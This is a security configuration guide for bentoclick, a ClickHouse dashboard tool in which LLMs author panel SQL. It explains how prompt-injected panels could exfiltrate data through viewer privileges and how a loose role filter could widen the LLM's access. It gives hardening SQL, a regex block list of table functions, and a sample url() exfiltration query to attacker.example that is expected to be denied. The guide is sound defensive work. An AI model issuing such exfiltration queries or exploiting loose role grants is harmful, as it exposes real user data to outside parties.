bentoclick — Security Configuration Guide

Deployment risks P5 and P6 — operator action required before exposing to untrusted LLMs or external users

Important context: tokenized masked sandboxing is not full anonymization. bentoclick's LLM-authoring flow operates against a masked sandbox database (<db>_anon, e.g. claude_otel_anon) where real identifiers are replaced with stable tokens. A de-tokenization step at view time rewrites panel SQL back to real tables and swaps tokens for real values — but only for human viewers. This architecture meaningfully limits what an LLM can see during authoring, but it does not eliminate all attack surface. The two risks documented below are not code bugs; they are deployment configuration responsibilities that each operator must satisfy before exposing bentoclick to semi-trusted LLMs or sharing dashboards with users.

Architecture summary

Understanding the two risk surfaces requires a mental model of the two identities in play:

LLM authoring channel
   CH identity: human email — narrowed by MCP role_filter to anon roles
   Reads: <db>_anon views, bentoclick.schema_guide, attr_guide
   Writes: bentoclick.dashboards_raw (via anon_author_role)

Saved dashboard panel = SQL string (authored by LLM)
   Stored in bentoclick.dashboards_tok / dashboards_raw
   De-tok MV rewrites <db>_anon → <db> + detokenizes via bentosecrets.*
   Final read target: bentoclick.dashboards

Human viewer channel
   SPA fetches panel SQL from bentoclick.dashboards
   Executes panel SQL AS the viewer's own CH identity
   ◀ P5 risk surface: panel SQL runs with viewer privileges

LLM session identity
   Today: human JWT, role_filter → anon roles only; execute_query is read-only
   ◀ P6 risk surface: isolation depends on filter staying correct
P5 — High Panel SQL runs with the viewer's privileges — no SQL allowlist
Status: requires configuration — viewer role grants are operator-defined; defaults may be too broad

Risk

A dashboard panel is stored as a raw SQL string authored by a semi-trusted LLM. At view time the SPA sends that SQL to ClickHouse as the human viewer's own identity. bentoclick sanitizes panel HTML output via sanitize_json_text, but it does not parse or allowlist the SQL itself. A malicious or prompt-injected panel can therefore do anything the viewer's ClickHouse user is permitted to do.

Why it matters

  • Exfiltration via table functions: url(), s3(), remote(), file(), mysql(), postgresql() and similar can tunnel data to an attacker-controlled endpoint if SOURCES privileges are granted to the viewer role.
  • Horizontal data access: if the viewer's grants include tables beyond what any dashboard should ever touch, a crafted panel silently reads them.
  • Resource exhaustion (DoS): without query-level caps, a panel can issue a full table scan that saturates the cluster.
  • DDL / data mutation: if the viewer somehow holds DDL or INSERT grants, a panel could alter or destroy tables.
The severity depends entirely on what bentoclick_viewer_role is granted. A viewer role with GRANT SELECT ON *.* and no SOURCES revoke is a full read exfiltration channel. A viewer role with narrow per-database grants and a hard readonly profile is safe.

Proper configuration

Step 1 — Attach a read-only settings profile with resource caps.

-- Create a profile that enforces read-only mode and sane query limits.
-- readonly=1 means: no INSERT/DDL/SET (except SET ROLE/SET SETTING guarded by
-- the profile itself). allow_ddl=0 is belt-and-suspenders.
-- Adjust the numeric caps for your cluster size.

CREATE SETTINGS PROFILE IF NOT EXISTS viewer_safe_profile
    SETTINGS
        readonly                    = 1,
        allow_ddl                   = 0,
        -- Time / row / byte guards
        max_execution_time          = 30,      -- seconds
        max_rows_to_read            = 100000000,
        max_bytes_to_read           = 5368709120,  -- 5 GiB
        max_memory_usage            = 2147483648,  -- 2 GiB
        -- Result-set guards (stop a panel from pulling down huge data)
        max_result_rows             = 10000,
        max_result_bytes            = 52428800  -- 50 MiB
    READONLY 1;  -- prevent a session from overriding these settings

ALTER ROLE bentoclick_viewer_role
    SETTINGS PROFILE viewer_safe_profile;

All constraints carry READONLY 1 so a panel cannot do SET max_execution_time = 999999 to escape them.

Step 2 — Revoke SOURCES to eliminate table-function exfiltration.

-- SOURCES is the umbrella privilege controlling all table functions that
-- open outbound connections. Revoking it at *.* removes the exfiltration
-- channel entirely, regardless of individual table-function availability.

REVOKE SOURCES ON *.* FROM bentoclick_viewer_role;

-- Belt-and-suspenders: revoke the individual function-level privileges too.
-- Relevant on older CH versions where SOURCES may not be a single umbrella.
REVOKE FILE    ON *.* FROM bentoclick_viewer_role;
REVOKE URL     ON *.* FROM bentoclick_viewer_role;
REVOKE REMOTE  ON *.* FROM bentoclick_viewer_role;
REVOKE S3      ON *.* FROM bentoclick_viewer_role;
REVOKE HDFS    ON *.* FROM bentoclick_viewer_role;
REVOKE MYSQL   ON *.* FROM bentoclick_viewer_role;
REVOKE POSTGRES ON *.* FROM bentoclick_viewer_role;
REVOKE MONGO   ON *.* FROM bentoclick_viewer_role;
REVOKE REDIS   ON *.* FROM bentoclick_viewer_role;
REVOKE SQLITE  ON *.* FROM bentoclick_viewer_role;
REVOKE ODBC    ON *.* FROM bentoclick_viewer_role;
REVOKE JDBC    ON *.* FROM bentoclick_viewer_role;

Step 3 — Narrow SELECT grants to exactly the databases dashboards need.

-- NEVER grant SELECT ON *.* to the viewer role.
-- Enumerate only the real databases that dashboards query.
-- Replace claude_otel with your actual database names.

GRANT SELECT ON claude_otel.* TO bentoclick_viewer_role;
GRANT SELECT ON system.metrics,
              system.asynchronous_metrics,
              system.events,
              system.processes,
              system.query_log
           TO bentoclick_viewer_role;
-- system views that expose replicas/parts/merges are fine if needed.
-- Do NOT grant system.users, system.roles, system.grants, etc.

-- Explicitly ensure no DDL, no INSERT, no dictGet on real secrets.
REVOKE INSERT ON *.* FROM bentoclick_viewer_role;
REVOKE dictGet ON *.* FROM bentoclick_viewer_role;
REVOKE SELECT ON bentosecrets.* FROM bentoclick_viewer_role;

Step 4 (optional, secondary) — Save-time regex guard in the dashboards MV.

The RBAC/profile approach above is unbypassable at the ClickHouse level. As an additional defence-in-depth measure, the materialized view that writes to dashboards_raw can reject obviously hostile SQL at save time, before it ever reaches a viewer. 

-- Add a check inside sanitize_panel (schema/01-database.sql) or as a
-- separate column constraint on dashboards_raw.
-- This is a secondary guard — do not rely on it as the only barrier.

ALTER TABLE bentoclick.dashboards_raw
    ADD CONSTRAINT chk_panel_sql_safe
    CHECK (
        NOT (
            -- block table functions by name (case-insensitive match)
            lower(panel_sql) REGEXP '\\b(url|s3|file|remote|mysql|postgresql|mongodb|redis|sqlite|odbc|jdbc|hdfs)\\s*\\('
            OR
            -- block mutation/DDL keywords
            lower(panel_sql) REGEXP '\\b(insert|alter|create|drop|truncate|rename|detach|attach|system|grant|revoke)\\b'
            OR
            -- block dictionary access (de-tok secrets are in bentosecrets dicts)
            lower(panel_sql) REGEXP '\\bdictget\\b'
            OR
            -- block statement separators (multi-statement injection)
            panel_sql REGEXP ';\\s*[^\\s]'
        )
    );

This regex is illustrative; tune it for your ClickHouse version's REGEXP syntax. The profile + REVOKE approach (steps 1–3) is the authoritative barrier.

Verify

After applying the above, run these checks as a user who holds bentoclick_viewer_role:

-- 1. Table-function exfiltration must be denied.
SELECT * FROM url('https://attacker.example/exfil', CSV, 'x String');
-- Expected: DB::Exception: ... not enough privileges ... (ACCESS_DENIED)

-- 2. Readonly profile must reject settings override.
SET max_execution_time = 9999;
-- Expected: DB::Exception: ... setting is readonly ... (SETTING_CONSTRAINT_VIOLATION)

-- 3. DDL must be denied.
CREATE TABLE bentoclick.pwn (x UInt8) ENGINE = Memory;
-- Expected: DB::Exception: ... not enough privileges ... (ACCESS_DENIED)

-- 4. bentosecrets must be unreadable.
SELECT * FROM bentosecrets.token_to_real LIMIT 1;
-- Expected: DB::Exception: ... not enough privileges ... (ACCESS_DENIED)

-- 5. Normal dashboard query must succeed.
SELECT count() FROM claude_otel.otel_traces LIMIT 1;
-- Expected: returns a number.
P6 — Medium LLM channel runs as the human identity narrowed by role_filter (SET ROLE fragility)
Current live posture: blocked — anon roles only are active; execute_query is read-only so SET ROLE is rejected. This configuration hardens against future misconfig.

Risk

In the current deployment, the MCP server authenticates the LLM authoring channel using the human user's JWT and narrows it to ^anon_ roles via a role_filter. This means the ClickHouse session runs as the human's email address with only anon_mcp_reader and anon_author_role active.

The concern: if that same email address also holds real-data grants (e.g. a direct SELECT ON claude_otel.* for their own BI use), those grants exist on the user object even though they are not currently active in the LLM session. Isolation therefore depends on:

  • The role_filter in the MCP config remaining correctly set to ^anon_.
  • The execute_query tool remaining read-only.
  • No path existing to call SET ROLE through the MCP tooling.
Current live posture (bentoclick on Altinity Cloud today): the MCP session enables only anon roles; real-data roles are inactive; execute_query is read-only, so a SET ROLE attempt is rejected at the ClickHouse level. The exploit is blocked in the current configuration. The hardening below is the correct product posture — it eliminates the dependency on those three conditions staying correct simultaneously.

Why it matters

  • Any future change to the MCP config that loosens role_filter or permits write-mode queries immediately widens the LLM's access to everything the human can see.
  • A dedicated service principal makes the isolation structural rather than policy-dependent: there are simply no real-data roles to activate, regardless of filter correctness.
  • It also eliminates the need for operators to audit "what does this email hold?" every time a user's direct grants change.

Proper configuration — dedicated LLM service principal

Step 1 — Create the service principal with only anon roles and no other grants.

-- Create a dedicated ClickHouse user for the LLM authoring channel.
-- This user MUST NOT hold any real-data roles or bentosecrets access.

CREATE USER IF NOT EXISTS bentoclick_llm
    IDENTIFIED WITH sha256_password BY '<strong-random-password>'
    DEFAULT ROLE anon_mcp_reader, anon_author_role
    SETTINGS PROFILE 'default';

-- Grant ONLY the two anon roles — nothing else.
GRANT anon_mcp_reader  TO bentoclick_llm;
GRANT anon_author_role TO bentoclick_llm;

-- Explicitly ensure no real-data access (belt-and-suspenders).
-- These should be no-ops if the user was freshly created, but are
-- worth stating explicitly for auditability.
REVOKE ALL ON claude_otel.* FROM bentoclick_llm;
REVOKE ALL ON bentosecrets.* FROM bentoclick_llm;
REVOKE ALL ON bentoclick.dashboards FROM bentoclick_llm;
-- bentoclick_llm writes via anon_author_role → dashboards_raw only.

-- Verify: the user must have no path to real data or secrets.
SELECT role_name
FROM   system.role_grants
WHERE  user_name = 'bentoclick_llm';
-- Must return: anon_mcp_reader, anon_author_role — and nothing else.

Step 2 — Configure the MCP server to authenticate as the service principal.

The MCP gating mode supports cluster-secret impersonation. Point the LLM channel at bentoclick_llm directly instead of forwarding the human JWT. The role_filter becomes redundant (but harmless to keep as defence-in-depth). 

# mcp-values.yaml (conceptual — adjust key names for your MCP chart version)
# This configures the altinity-mcp server for the LLM authoring channel.

altinityMcp:
  mode: gating                     # gating mode: MCP validates then impersonates

  clickhouse:
    # Fixed service-principal credentials for the LLM channel.
    # Auth.Username overrides the inbound JWT identity.
    auth:
      username: bentoclick_llm
      passwordSecret:
        name: bentoclick-llm-credentials
        key: clickhouse-password

    # Narrow the tool surface: read-only execute_query + schema inspection only.
    tools:
      execute_query:
        readonly: true
      allowed:
        - execute_query
        - describe_schema
        - describe_attributes
        - get_dashboards_prefix
        - save_dashboard

  # role_filter is redundant with a dedicated principal but kept for clarity.
  roleFilter: "^anon_"

  # The human email is passed as a metadata claim for dashboard ownership
  # (see Step 3 below) but is NOT used as the CH identity.
  ownerClaim: email

Exact field names depend on your altinity-mcp chart version. The key invariant: Auth.Username must be the service principal, not the inbound JWT subject.

Step 3 — Resolve the owner-stamping tension.

bentoclick routes dashboards at /b/<owner>/<slug> where owner is stamped at save time via currentUser(). With a service principal, all dashboards would be owned by bentoclick_llm, breaking routing.

The correct fix is to pass the human's email explicitly to save_dashboard and have the dashboards_mv stamp owner from that column instead of currentUser(): 

-- In the save_dashboard MCP tool, pass the human email as a parameter.
-- The MCP server extracts it from the verified JWT claim before impersonating.

-- In dashboards_raw, add an owner_override column:
ALTER TABLE bentoclick.dashboards_raw
    ADD COLUMN IF NOT EXISTS owner_override String DEFAULT '';

-- In the materialized view (dashboards_mv), use owner_override when non-empty:
CREATE MATERIALIZED VIEW bentoclick.dashboards_mv
    TO bentoclick.dashboards
    DEFINER = bentoclick_definer
    SQL SECURITY DEFINER
    AS
    SELECT
        /* other columns ... */
        if(owner_override != '', owner_override, currentUser()) AS owner,
        /* panels, title, slug ... */
    FROM bentoclick.dashboards_raw;

-- NOTE: owner_override must only be settable via the gated MCP path,
-- not by arbitrary callers. The anon_author_role INSERT on dashboards_raw
-- should be audited to ensure external callers cannot forge the owner.
Audit note: if owner_override can be freely set by anyone with INSERT on dashboards_raw, it introduces a dashboard-ownership spoofing vector. The MCP server must be the only path that populates this column, and it must validate the email against the verified JWT before passing it through.

Verify

-- 1. The service principal must have no real-data roles.
SELECT role_name
FROM   system.role_grants
WHERE  user_name = 'bentoclick_llm';
-- Must return exactly: anon_mcp_reader, anon_author_role

-- 2. Real data must be unreachable as bentoclick_llm.
-- (Run from a CH client authenticated as bentoclick_llm)
SELECT count() FROM claude_otel.otel_traces;
-- Expected: ACCESS_DENIED

-- 3. SET ROLE must fail (no real roles to activate).
SET ROLE ALL;
SELECT currentRoles();
-- Must return only {anon_mcp_reader, anon_author_role}.

-- 4. Anon sandbox must be readable (basic smoke test).
SELECT count() FROM claude_otel_anon.otel_traces_anon LIMIT 1;
-- Expected: returns a number.

-- 5. bentosecrets must be unreadable.
SELECT count() FROM bentosecrets.identifier_map;
-- Expected: ACCESS_DENIED
